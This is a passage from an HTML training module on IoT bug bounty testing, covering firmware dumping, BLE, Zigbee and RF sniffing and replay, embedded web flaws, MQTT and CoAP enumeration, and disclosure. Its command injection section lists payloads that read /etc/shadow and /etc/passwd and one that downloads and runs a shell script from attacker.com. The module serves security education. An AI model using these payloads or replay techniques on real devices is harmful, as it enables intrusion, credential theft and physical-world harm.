+            <div class="code-block"><span class="comment"># Read SPI flash using flashrom with CH341A programmer</span>
+<span class="cmd">flashrom</span> <span class="flag">-p</span> <span class="str">ch341a_spi</span> <span class="flag">-r</span> <span class="str">flash_dump.bin</span>
+
+<span class="comment"># Identify the flash chip first</span>
+<span class="cmd">flashrom</span> <span class="flag">-p</span> <span class="str">ch341a_spi</span>
+<span class="comment"># Output: Found Winbond flash chip "W25Q64" (8192 kB)</span>
+
+<span class="comment"># Read with Bus Pirate</span>
+<span class="cmd">flashrom</span> <span class="flag">-p</span> <span class="str">buspirate_spi:dev=/dev/ttyUSB0</span> <span class="flag">-r</span> <span class="str">flash_dump.bin</span>
+
+<span class="comment"># Analyze the dump with binwalk</span>
+<span class="cmd">binwalk</span> <span class="flag">-eM</span> <span class="str">flash_dump.bin</span></div>
+
+            <h3>Logic Analyzer Usage</h3>
+
+            <p>
+                A logic analyzer captures digital signals on hardware buses, allowing you to
+                decode communication protocols in real time. When you cannot identify the baud
+                rate of a UART connection, when you need to sniff I2C or SPI traffic between
+                chips on the PCB, or when you want to capture the communication between the
+                device's main processor and its wireless module, a logic analyzer makes the
+                invisible visible. Affordable USB logic analyzers (Saleae Logic clones, around
+                $10-15) handle most IoT debugging tasks.
+            </p>
+        </div>
+    </div>
+
+    <!-- Section 4: Wireless Protocol Attacks -->
+    <div class="section" id="s4">
+        <div class="section-number">Section 04</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128225;</span>
+            Wireless Protocol Attacks
+        </h2>
+        <div class="section-body">
+            <p>
+                IoT devices communicate over a variety of wireless protocols, each with its own
+                security model and attack surface. While Wi-Fi security is relatively mature,
+                protocols designed specifically for IoT &mdash; BLE, Zigbee, Z-Wave, and
+                various proprietary RF implementations &mdash; often prioritize low power
+                consumption and simplicity over security. These protocols operate in frequency
+                bands that can be monitored with inexpensive software-defined radios, and their
+                security implementations frequently contain weaknesses that have been known for
+                years but never patched because of the cost of updating deployed devices.
+            </p>
+
+            <h3>BLE (Bluetooth Low Energy)</h3>
+
+            <p>
+                Bluetooth Low Energy is the most common wireless protocol in consumer IoT devices.
+                Smart locks, fitness trackers, medical devices, and home automation products all
+                use BLE for communication with mobile apps. BLE's security model supports
+                pairing with encryption, but many devices implement "Just Works" pairing (no
+                PIN, no authentication) or communicate sensitive data over unencrypted GATT
+                characteristics.
+            </p>
+
+            <div class="code-block"><span class="comment"># Scan for BLE devices</span>
+<span class="cmd">sudo</span> <span class="cmd">hcitool</span> <span class="flag">lescan</span>
+
+<span class="comment"># Connect and enumerate services/characteristics</span>
+<span class="cmd">gatttool</span> <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-I</span>
+[AA:BB:CC:DD:EE:FF][LE]&gt; connect
+[AA:BB:CC:DD:EE:FF][LE]&gt; primary       <span class="comment"># List services</span>
+[AA:BB:CC:DD:EE:FF][LE]&gt; characteristics  <span class="comment"># List characteristics</span>
+[AA:BB:CC:DD:EE:FF][LE]&gt; char-read-hnd 0x0025  <span class="comment"># Read a value</span>
+
+<span class="comment"># Using bettercap for BLE enumeration</span>
+<span class="cmd">sudo</span> <span class="cmd">bettercap</span>
+&gt;&gt; ble.recon on
+&gt;&gt; ble.enum AA:BB:CC:DD:EE:FF</div>
+
+            <h3>BLE Attack Patterns</h3>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128275;</div>
+                    <div class="concept-card-title">Sniffing &amp; Replay</div>
+                    <div class="concept-card-body">
+                        Capture BLE communication between a device and its mobile app using a
+                        sniffer (Ubertooth, nRF52840 dongle). If commands are sent in plaintext
+                        or use static tokens, replay them to control the device without the
+                        legitimate app.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128274;</div>
+                    <div class="concept-card-title">MITM Attacks</div>
+                    <div class="concept-card-body">
+                        Position yourself between the device and the mobile app during the pairing
+                        process. "Just Works" pairing is vulnerable to MITM because neither party
+                        authenticates the other. Tools like GATTacker facilitate BLE MITM attacks.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128259;</div>
+                    <div class="concept-card-title">Fuzzing GATT Services</div>
+                    <div class="concept-card-body">
+                        Write unexpected values to writable GATT characteristics. Many devices
+                        have minimal input validation on BLE commands, leading to crashes, buffer
+                        overflows, or unintended behavior when receiving malformed data.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128203;</div>
+                    <div class="concept-card-title">Static Key Analysis</div>
+                    <div class="concept-card-body">
+                        Extract the BLE pairing key or application-layer authentication token from
+                        the mobile app's source code or the device firmware. Many devices use
+                        hardcoded or predictable keys that are shared across all units of the same
+                        product.
+                    </div>
+                </div>
+            </div>
+
+            <h3>Zigbee and Z-Wave</h3>
+
+            <p>
+                Zigbee and Z-Wave are mesh networking protocols used primarily in home automation
+                &mdash; smart lighting, door locks, thermostats, and security sensors. Both
+                protocols support encryption, but implementation weaknesses are common. Zigbee
+                networks have been shown to be vulnerable to key extraction during the pairing
+                process, and Z-Wave S0 security (the predecessor to the current S2 standard)
+                uses a known, fixed key for the initial key exchange.
+            </p>
+
+            <div class="code-block"><span class="comment"># Zigbee sniffing with KillerBee and an Atmel RZ RAVEN USB stick</span>
+<span class="cmd">zbstumbler</span>
+<span class="comment"># Lists Zigbee networks and their channels</span>
+
+<span class="cmd">zbdump</span> <span class="flag">-c</span> <span class="str">15</span> <span class="flag">-w</span> <span class="str">zigbee_capture.pcap</span>
+<span class="comment"># Capture Zigbee traffic on channel 15</span>
+
+<span class="comment"># Analyze capture in Wireshark with Zigbee dissector</span>
+<span class="cmd">wireshark</span> <span class="str">zigbee_capture.pcap</span>
+
+<span class="comment"># Z-Wave sniffing requires Z-Wave USB stick (e.g., Sigma UZB)</span>
+<span class="comment"># Tools: Scapy-radio, EZ-Wave, Z-Wave sniffer firmware</span></div>
+
+            <h3>SDR Basics for IoT Testing</h3>
+
+            <p>
+                Software-Defined Radio (SDR) enables testing of proprietary wireless protocols
+                that do not use standard Bluetooth, Wi-Fi, or Zigbee. Many IoT devices &mdash;
+                garage door openers, wireless doorbells, key fobs, remote sensors &mdash;
+                communicate on ISM bands (315 MHz, 433 MHz, 868 MHz, 915 MHz) using simple
+                OOK (On-Off Keying) or FSK (Frequency Shift Keying) modulation with no encryption.
+                These signals can be captured and replayed with an inexpensive RTL-SDR dongle ($20)
+                for reception or a HackRF One ($300) for transmission.
+            </p>
+
+            <div class="code-block"><span class="comment"># Capture RF signals with rtl_433</span>
+<span class="cmd">rtl_433</span> <span class="flag">-f</span> <span class="str">433920000</span> <span class="flag">-S all</span>
+<span class="comment"># Records all signals detected at 433.92 MHz</span>
+
+<span class="comment"># Analyze signals with Universal Radio Hacker (URH)</span>
+<span class="cmd">urh</span>
+<span class="comment"># GUI tool for recording, demodulating, and analyzing RF signals</span>
+
+<span class="comment"># Replay captured signals with HackRF</span>
+<span class="cmd">hackrf_transfer</span> <span class="flag">-t</span> <span class="str">captured_signal.raw</span> <span class="flag">-f</span> <span class="str">433920000</span> <span class="flag">-s</span> <span class="str">2000000</span></div>
+
+            <div class="callout callout-warning">
+                <span class="callout-icon">&#9888;</span>
+                <div>
+                    <div class="callout-title">Legal Considerations</div>
+                    <div class="callout-text">
+                        Transmitting on radio frequencies is regulated by law in every country.
+                        Using an SDR to receive and analyze signals is generally legal. Transmitting
+                        &mdash; including replaying captured signals &mdash; may require a license
+                        depending on the frequency, power level, and your jurisdiction. Never transmit
+                        on frequencies used by emergency services, aviation, or maritime communication.
+                        For bug bounty testing, document your capture and analysis methodology and
+                        consult local regulations before any transmission.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 5: Embedded Web Interfaces -->
+    <div class="section" id="s5">
+        <div class="section-number">Section 05</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#127760;</span>
+            Embedded Web Interfaces
+        </h2>
+        <div class="section-body">
+            <p>
+                Nearly every IoT device ships with a web-based management interface. These
+                interfaces are built with constrained resources &mdash; limited memory, slow
+                processors, and small development teams &mdash; which leads to security
+                shortcomings that would be unacceptable in a modern web application. The web
+                servers are typically lightweight implementations (lighttpd, mini_httpd, GoAhead,
+                or custom C-based servers) running CGI scripts written in C, Lua, or shell script.
+                The combination of a simple web server with native code CGI handlers is a recipe
+                for command injection, buffer overflows, and authentication bypasses.
+            </p>
+
+            <h3>Common Web Vulnerabilities in IoT</h3>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Vulnerability</th>
+                        <th>Prevalence in IoT</th>
+                        <th>Root Cause</th>
+                        <th>Typical Impact</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">Command Injection</td>
+                        <td>Very High</td>
+                        <td>CGI scripts passing user input to system() or popen() without sanitization</td>
+                        <td>Root shell on the device</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Default Credentials</td>
+                        <td>Very High</td>
+                        <td>Hardcoded or predictable admin passwords, often the same across all devices of a model</td>
+                        <td>Full device compromise</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Authentication Bypass</td>
+                        <td>High</td>
+                        <td>Broken session management, direct URL access to admin pages, path traversal past auth checks</td>
+                        <td>Unauthenticated admin access</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Buffer Overflow</td>
+                        <td>High</td>
+                        <td>C-based CGI handlers with fixed-size buffers and no bounds checking</td>
+                        <td>Code execution, denial of service</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Information Disclosure</td>
+                        <td>High</td>
+                        <td>Debug pages, configuration dumps, hardware serial numbers exposed without auth</td>
+                        <td>Credential leakage, network mapping</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Command Injection in IoT Web Interfaces</h3>
+
+            <p>
+                Command injection is the most common critical vulnerability in IoT web interfaces.
+                Device management functions like ping, traceroute, DNS lookup, and firmware update
+                are implemented by passing user-supplied input directly to shell commands. The
+                input reaches a call like <span class="inline-code">system("ping -c 4 " + user_input)</span>
+                without any sanitization, allowing an attacker to append arbitrary commands.
+            </p>
+
+            <div class="code-block"><span class="comment"># Common command injection test payloads for IoT</span>
+<span class="comment"># In ping/traceroute/diagnostic fields:</span>
+
+<span class="str">192.168.1.1; id</span>
+<span class="str">192.168.1.1 &amp;&amp; cat /etc/shadow</span>
+<span class="str">192.168.1.1 | ls -la /</span>
+<span class="str">$(whoami)</span>
+<span class="str">`id`</span>
+
+<span class="comment"># In filename/path fields (firmware upload, config import):</span>
+<span class="str">file.cfg; wget http://attacker.com/shell.sh -O /tmp/s; sh /tmp/s</span>
+
+<span class="comment"># In network configuration fields (hostname, NTP server):</span>
+<span class="str">attacker.com; id</span>
+<span class="str">$(cat /etc/passwd)</span></div>
+
+            <h3>Default Credentials at Scale</h3>
+
+            <p>
+                The default credential problem in IoT is systemic. Unlike web applications where
+                each deployment gets a unique initial password, IoT devices ship with identical
+                credentials across every unit of the same model. Manufacturers use credentials
+                like <span class="inline-code">admin/admin</span>,
+                <span class="inline-code">root/root</span>, or device-specific defaults that are
+                documented in publicly available user manuals. Some devices generate passwords
+                from the device's MAC address or serial number, which are discoverable through
+                the web interface itself.
+            </p>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128270;</span>
+                        <div>
+                            <div class="detail-header-title">Default Credential Databases</div>
+                            <div class="detail-header-subtitle">Resources for finding manufacturer default passwords</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>Several databases catalog default credentials for IoT and network devices:</p>
+                    <ul>
+                        <li><strong style="color:#c4a0d8;">cirt.net</strong> &mdash; One of the oldest default password databases, covering routers, cameras, printers, and industrial equipment</li>
+                        <li><strong style="color:#c4a0d8;">datarecovery.com/rd/default-passwords</strong> &mdash; Searchable database organized by manufacturer</li>
+                        <li><strong style="color:#c4a0d8;">Manufacturer documentation</strong> &mdash; User manuals and quick-start guides frequently list default credentials in plain text</li>
+                        <li><strong style="color:#c4a0d8;">Shodan</strong> &mdash; Device banners often reveal the manufacturer and model, which maps to known defaults</li>
+                    </ul>
+                    <p>
+                        In a bug bounty context, demonstrating that a device uses default or
+                        hardcoded credentials that cannot be changed by the user is a valid
+                        finding. Devices that generate passwords from predictable inputs (MAC
+                        address, serial number) without using a cryptographically secure derivation
+                        function are also vulnerable, as these inputs are often disclosed by the
+                        device itself.
+                    </p>
+                </div>
+            </div>
+
+            <h3>Firmware Update Mechanisms</h3>
+
+            <p>
+                The firmware update process is a critical attack surface. If a device downloads
+                firmware updates over HTTP (not HTTPS), does not verify the cryptographic
+                signature of the firmware image, or accepts firmware from any source without
+                server authentication, an attacker on the same network can serve a malicious
+                firmware image to the device during the update process. This is a complete
+                device compromise &mdash; the attacker controls every aspect of the device's
+                software stack.
+            </p>
+
+            <ul>
+                <li><strong style="color:#c4a0d8;">No HTTPS</strong> &mdash; Firmware downloaded over cleartext HTTP is trivially interceptable on the local network.</li>
+                <li><strong style="color:#c4a0d8;">No signature verification</strong> &mdash; The device installs any firmware image without checking a cryptographic signature against a known public key.</li>
+                <li><strong style="color:#c4a0d8;">Rollback attacks</strong> &mdash; The device accepts older firmware versions, allowing downgrade to a version with known vulnerabilities.</li>
+                <li><strong style="color:#c4a0d8;">Update server spoofing</strong> &mdash; The device does not validate the identity of the update server, accepting firmware from any host that responds.</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Section 6: IoT Network Protocols -->
+    <div class="section" id="s6">
+        <div class="section-number">Section 06</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128260;</span>
+            IoT Network Protocols
+        </h2>
+        <div class="section-body">
+            <p>
+                IoT devices use specialized network protocols designed for constrained environments.
+                These protocols prioritize low bandwidth, small packet sizes, and minimal processing
+                overhead. The security implications are significant &mdash; the protocols were
+                designed with the assumption that they would operate on trusted networks, but IoT
+                deployments increasingly bridge these protocols to the public internet through
+                cloud gateways and brokers.
+            </p>
+
+            <h3>MQTT (Message Queuing Telemetry Transport)</h3>
+
+            <p>
+                MQTT is the dominant protocol for IoT messaging. It uses a publish/subscribe model
+                where devices publish messages to topics on a broker, and other devices or services
+                subscribe to those topics to receive messages. The security model depends entirely
+                on broker configuration &mdash; many MQTT brokers are deployed with no
+                authentication, allowing anyone to subscribe to all topics (including those
+                carrying sensor data, control commands, and credentials) or publish messages
+                that control physical devices.
+            </p>
+
+            <div class="code-block"><span class="comment"># Discover MQTT brokers via Shodan</span>
+<span class="comment"># "MQTT" port:1883 org:"Target Corp"</span>
+
+<span class="comment"># Connect to an MQTT broker without credentials</span>
+<span class="cmd">mosquitto_sub</span> <span class="flag">-h</span> <span class="str">broker.target.com</span> <span class="flag">-t</span> <span class="str">"#"</span> <span class="flag">-v</span>
+<span class="comment"># "#" subscribes to ALL topics</span>
+<span class="comment"># "-v" shows topic names alongside messages</span>
+
+<span class="comment"># Subscribe to specific topic patterns</span>
+<span class="cmd">mosquitto_sub</span> <span class="flag">-h</span> <span class="str">broker.target.com</span> <span class="flag">-t</span> <span class="str">"devices/+/status"</span> <span class="flag">-v</span>
+<span class="cmd">mosquitto_sub</span> <span class="flag">-h</span> <span class="str">broker.target.com</span> <span class="flag">-t</span> <span class="str">"$SYS/#"</span> <span class="flag">-v</span>
+<span class="comment"># $SYS topics contain broker statistics and metadata</span>
+
+<span class="comment"># Publish a test message (exercise extreme caution)</span>
+<span class="cmd">mosquitto_pub</span> <span class="flag">-h</span> <span class="str">broker.target.com</span> <span class="flag">-t</span> <span class="str">"test/topic"</span> <span class="flag">-m</span> <span class="str">"test"</span></div>
+
+            <div class="callout callout-danger">
+                <span class="callout-icon">&#9888;</span>
+                <div>
+                    <div class="callout-title">Never Publish to Production MQTT Brokers</div>
+                    <div class="callout-text">
+                        An unauthenticated MQTT broker that controls physical devices (door locks,
+                        HVAC systems, industrial valves) creates a direct path from a network
+                        vulnerability to physical-world consequences. In a bug bounty context,
+                        <strong>never publish messages to production MQTT topics</strong>. Subscribe
+                        to demonstrate read access, document the topic structure and message formats
+                        to prove you understand the control plane, and report the finding with a
+                        clear explanation of the potential impact. A published message to the wrong
+                        topic could cause physical damage or endanger people.
+                    </div>
+                </div>
+            </div>
+
+            <h3>CoAP (Constrained Application Protocol)</h3>
+
+            <p>
+                CoAP is a lightweight protocol designed for constrained IoT devices, operating over
+                UDP rather than TCP. It follows a REST-like model (GET, POST, PUT, DELETE) similar
+                to HTTP but with significantly smaller overhead. CoAP uses port 5683 by default and
+                supports DTLS for encryption, though many deployments omit it. Unauthenticated CoAP
+                endpoints can be discovered and queried with the <span class="inline-code">coap-client</span>
+                tool.
+            </p>
+
+            <div class="code-block"><span class="comment"># Query a CoAP endpoint</span>
+<span class="cmd">coap-client</span> <span class="flag">-m get</span> <span class="str">coap://target:5683/.well-known/core</span>
+<span class="comment"># Lists all available CoAP resources</span>
+
+<span class="comment"># Read sensor data</span>
+<span class="cmd">coap-client</span> <span class="flag">-m get</span> <span class="str">coap://target:5683/sensors/temperature</span>
+
+<span class="comment"># Shodan discovery</span>
+<span class="comment"># "CoAP" port:5683</span></div>
+
+            <h3>UPnP/SSDP and mDNS</h3>
+
+            <p>
+                Universal Plug and Play (UPnP) and its discovery protocol SSDP (Simple Service
+                Discovery Protocol) allow devices to automatically discover and interact with
+                each other on local networks. UPnP is notorious for security issues: it allows
+                devices to open ports on routers (via IGD), expose service descriptions (XML files
+                describing device capabilities and control URLs), and in many cases accept
+                unauthenticated SOAP commands to control device functions.
+            </p>
+
+            <div class="code-block"><span class="comment"># Discover UPnP devices on the local network</span>
+<span class="cmd">gssdp-discover</span> <span class="flag">--timeout=5</span>
+
+<span class="comment"># Alternative: use upnpc</span>
+<span class="cmd">upnpc</span> <span class="flag">-l</span>
+
+<span class="comment"># Discover mDNS services (Bonjour/Avahi)</span>
+<span class="cmd">avahi-browse</span> <span class="flag">-a -t</span>
+
+<span class="comment"># Resolve specific mDNS names</span>
+<span class="cmd">avahi-resolve</span> <span class="flag">-n</span> <span class="str">device.local</span>
+
+<span class="comment"># Check for UPnP XML descriptions</span>
+<span class="cmd">curl</span> <span class="flag">-s</span> <span class="str">http://192.168.1.1:49152/rootDesc.xml</span></div>
+
+            <h3>Protocol-Specific Attack Patterns</h3>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Protocol</th>
+                        <th>Port</th>
+                        <th>Common Weakness</th>
+                        <th>Testing Approach</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">MQTT</td>
+                        <td>1883 / 8883 (TLS)</td>
+                        <td>No authentication, wildcard subscribe, no ACLs on topics</td>
+                        <td>Subscribe to # topic, enumerate $SYS, review topic structure</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">CoAP</td>
+                        <td>5683</td>
+                        <td>No DTLS, unauthenticated resource access</td>
+                        <td>Query .well-known/core, enumerate resources, test write access</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">UPnP/SSDP</td>
+                        <td>1900 (SSDP) / varies</td>
+                        <td>Unauthenticated service control, port forwarding manipulation</td>
+                        <td>Discover services, read XML descriptions, test SOAP actions</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">mDNS</td>
+                        <td>5353</td>
+                        <td>Information disclosure (service names, hostnames, ports)</td>
+                        <td>Browse advertised services, resolve device names</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">AMQP</td>
+                        <td>5672</td>
+                        <td>Default guest/guest credentials on RabbitMQ</td>
+                        <td>Connect with default creds, enumerate queues and exchanges</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Section 7: IoT Testing Methodology -->
+    <div class="section" id="s7">
+        <div class="section-number">Section 07</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128736;</span>
+            IoT Testing Methodology
+        </h2>
+        <div class="section-body">
+            <p>
+                A complete IoT security assessment requires integrating hardware analysis, firmware
+                reverse engineering, network protocol testing, and web application testing into a
+                coherent workflow. The methodology below covers both remote-only testing (when you
+                only have network access to the device) and physical testing (when you have the
+                device on your workbench).
+            </p>
+
+            <h3>Complete IoT Assessment Workflow</h3>
+
+            <ol class="numbered-list">
+                <li>
+                    <strong style="color:#c4a0d8;">Reconnaissance.</strong> Identify the device
+                    manufacturer, model, firmware version, and chipset. Check for published
+                    firmware updates, user manuals, FCC filings (which often include internal
+                    PCB photos), and known CVEs for the device or its components.
+                </li>
+                <li>
+                    <strong style="color:#c4a0d8;">Firmware acquisition and analysis.</strong>
+                    Download or extract firmware. Use binwalk for extraction, grep for hardcoded
+                    credentials, analyze the web application code, and identify the runtime
+                    services and their configurations.
+                </li>
+                <li>
+                    <strong style="color:#c4a0d8;">Hardware interface identification.</strong>
+                    If you have physical access, open the case and photograph the PCB. Identify
+                    UART, JTAG, and SPI pads. Connect to UART and capture boot logs. Attempt
+                    to get a shell.
+                </li>
+                <li>
+                    <strong style="color:#c4a0d8;">Network service enumeration.</strong>
+                    Scan the device for open ports and running services. Identify the web server,
+                    MQTT broker, telnet/SSH, UPnP, and any custom services. Document each service
+                    and its version.
+                </li>
+                <li>
+                    <strong style="color:#c4a0d8;">Web interface testing.</strong>
+                    Test the web management interface for command injection, authentication bypass,
+                    default credentials, path traversal, and information disclosure. Focus on
+                    diagnostic functions and configuration import/export features.
+                </li>
+                <li>
+                    <strong style="color:#c4a0d8;">Protocol analysis.</strong>
+                    Test MQTT, CoAP, UPnP, and any proprietary protocols for authentication
+                    weaknesses and unauthorized access. Capture and analyze wireless communications
+                    if applicable.
+                </li>
+                <li>
+                    <strong style="color:#c4a0d8;">Firmware update testing.</strong>
+                    Analyze the update mechanism for HTTPS usage, signature verification, rollback
+                    protection, and update server authentication.
+                </li>
+                <li>
+                    <strong style="color:#c4a0d8;">Cloud backend assessment.</strong>
+                    Test the cloud APIs that the device communicates with for IDOR, broken
+                    authentication, and unauthorized access to other users' devices.
+                </li>
+                <li>
+                    <strong style="color:#c4a0d8;">Report with impact.</strong>
+                    Document each finding with device model, firmware version, hardware revision,
+                    and clear reproduction steps. Explain the physical-world impact of each
+                    vulnerability.
+                </li>
+            </ol>
+
+            <h3>Lab Setup Recommendations</h3>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3><span class="li-marker">&#9670;</span> Essential Equipment</h3>
+                    <ul>
+                        <li><span class="li-marker">&#8250;</span> USB-to-UART adapter (FTDI or CP2102, ~$10)</li>
+                        <li><span class="li-marker">&#8250;</span> Logic analyzer (Saleae clone, ~$15)</li>
+                        <li><span class="li-marker">&#8250;</span> SPI programmer (CH341A, ~$5)</li>
+                        <li><span class="li-marker">&#8250;</span> Multimeter for identifying pins</li>
+                        <li><span class="li-marker">&#8250;</span> Fine-tip soldering iron and flux</li>
+                        <li><span class="li-marker">&#8250;</span> Test clips (SOIC8 clip for flash chips)</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3><span class="li-marker">&#9670;</span> Optional / Advanced</h3>
+                    <ul>
+                        <li><span class="li-marker">&#8250;</span> RTL-SDR dongle for RF analysis (~$20)</li>
+                        <li><span class="li-marker">&#8250;</span> HackRF One for RF transmission (~$300)</li>
+                        <li><span class="li-marker">&#8250;</span> nRF52840 dongle for BLE sniffing (~$10)</li>
+                        <li><span class="li-marker">&#8250;</span> JTAG adapter (J-Link EDU, ~$60)</li>
+                        <li><span class="li-marker">&#8250;</span> Hot air rework station for chip removal</li>
+                        <li><span class="li-marker">&#8250;</span> Oscilloscope for signal analysis</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>Tools Summary</h3>
+
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">binwalk</div>
+                    <div class="tool-role">Firmware Analysis</div>
+                    <div class="tool-desc">Signature-based firmware extraction and entropy analysis. The standard first tool for any firmware image.</div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">Firmadyne</div>
+                    <div class="tool-role">Firmware Emulation</div>
+                    <div class="tool-desc">Automated firmware emulation framework using QEMU. Enables testing device web interfaces without hardware.</div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">Ghidra</div>
+                    <div class="tool-role">Binary Analysis</div>
+                    <div class="tool-desc">Free reverse engineering framework supporting ARM, MIPS, and other IoT architectures. Essential for analyzing compiled CGI binaries.</div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">flashrom</div>
+                    <div class="tool-role">Flash Chip Reader</div>
+                    <div class="tool-desc">Reads and writes SPI flash chips using various programmers. Direct firmware extraction from hardware.</div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">mosquitto_sub/pub</div>
+                    <div class="tool-role">MQTT Client</div>
+                    <div class="tool-desc">Command-line MQTT subscribe and publish tools. Essential for testing MQTT broker authentication and topic access.</div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">bettercap</div>
+                    <div class="tool-role">Network &amp; BLE Toolkit</div>
+                    <div class="tool-desc">Swiss-army knife for network attacks, BLE enumeration, and Wi-Fi testing. Includes modules for IoT protocol discovery.</div>
+                </div>
+            </div>
+
+            <h3>Reporting IoT Vulnerabilities</h3>
+
+            <p>
+                IoT vulnerability reports require additional context beyond standard web findings.
+                The report must enable the manufacturer to reproduce the issue with a specific
+                device and firmware version, understand the physical-world impact, and prioritize
+                the fix within their firmware update cycle. Include the following:
+            </p>
+
+            <ul>
+                <li><strong style="color:#c4a0d8;">Device identification:</strong> Manufacturer, model number, hardware revision (often printed on the PCB), and exact firmware version string.</li>
+                <li><strong style="color:#c4a0d8;">Attack prerequisites:</strong> Network access only? Physical access required? Specific wireless range? Authentication needed?</li>
+                <li><strong style="color:#c4a0d8;">Physical-world impact:</strong> A command injection on a smart lock is different from a command injection on a temperature sensor. Describe what the attacker can do to the physical device and its users.</li>
+                <li><strong style="color:#c4a0d8;">Scale of impact:</strong> How many devices are affected? Is the vulnerability in a shared firmware across a product line? Can it be exploited remotely across the internet or only on the local network?</li>
+                <li><strong style="color:#c4a0d8;">Remediation complexity:</strong> Does fixing this require a firmware update pushed to all deployed devices? Is there a workaround available to users?</li>
+            </ul>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128270;</span>
+                        <div>
+                            <div class="detail-header-title">Common High-Impact IoT Findings</div>
+                            <div class="detail-header-subtitle">Vulnerabilities that consistently receive high severity ratings</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <ol class="numbered-list">
+                        <li><strong style="color:#c4a0d8;">Hardcoded root credentials</strong> &mdash; Same root password across all devices of a model, discoverable in the firmware. Cannot be changed by the user.</li>
+                        <li><strong style="color:#c4a0d8;">Command injection in web interface</strong> &mdash; Diagnostic tools (ping, traceroute) or configuration fields that pass input to shell commands without sanitization.</li>
+                        <li><strong style="color:#c4a0d8;">Unsigned firmware updates</strong> &mdash; Device accepts any firmware image without cryptographic verification, enabling malicious firmware installation.</li>
+                        <li><strong style="color:#c4a0d8;">Unauthenticated MQTT broker</strong> &mdash; Device control messages published to a broker with no authentication, allowing any network participant to control the device.</li>
+                        <li><strong style="color:#c4a0d8;">Shared TLS private keys</strong> &mdash; The same TLS private key embedded in firmware across all devices, allowing any researcher who extracts it to decrypt traffic from any unit.</li>
+                        <li><strong style="color:#c4a0d8;">UART root shell without authentication</strong> &mdash; Debug serial port provides immediate root access with no login required. Physical access only, but demonstrates lack of hardware security design.</li>
+                        <li><strong style="color:#c4a0d8;">Cloud API IDOR</strong> &mdash; The cloud backend that manages the device allows accessing other users' devices by changing device IDs in API requests.</li>
+                        <li><strong style="color:#c4a0d8;">BLE replay attacks on smart locks</strong> &mdash; Capturing and replaying BLE unlock commands that use static or predictable tokens.</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Discussion Prompts -->
+    <div class="section" id="discuss">
+        <div class="discussion-section">
+            <div class="discussion-title">
+                <span>&#128172;</span>
+                Discussion Prompts
+            </div>
+            <ul class="prompt-list">
+                <li class="prompt-item">
+                    <span class="prompt-num">01</span>
+                    You discover that a smart door lock uses BLE with "Just Works" pairing and transmits the unlock command as a static, unencrypted byte sequence that can be replayed by anyone within BLE range (~30 meters). The manufacturer's bug bounty program has a 90-day disclosure deadline. Given that a firmware update for this device would take 6-12 months to develop, test, and deploy, how would you handle the disclosure timeline? What if the manufacturer stops responding after your initial report?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">02</span>
+                    Consider the ethical implications of publishing IoT vulnerability research. Unlike web applications where the vendor can deploy a patch instantly, IoT devices may never receive a firmware update &mdash; many users do not update device firmware, and some devices have no update mechanism at all. How does this change your approach to public disclosure compared to web application vulnerabilities? Should IoT vulnerabilities follow different disclosure timelines?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">03</span>
+                    You want to start an IoT security testing practice but have a limited budget. Design a starter lab setup for under $100 that would allow you to begin testing consumer IoT devices effectively. What hardware would you purchase, what software tools would you install, and what category of devices would you target first for bug bounty research?
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Completion -->
+    <div class="section" id="completion">
+        <div class="completion-section">
+            <div class="completion-icon">&#10003;</div>
+            <h2 class="completion-title">Module Complete</h2>
+            <p class="completion-text">
+                You have covered the IoT bug bounty landscape and responsible disclosure
+                considerations, firmware extraction and analysis with binwalk, hardware debug
+                interfaces including UART, JTAG, and SPI, wireless protocol attacks on BLE,
+                Zigbee, and proprietary RF, embedded web interface vulnerabilities and command
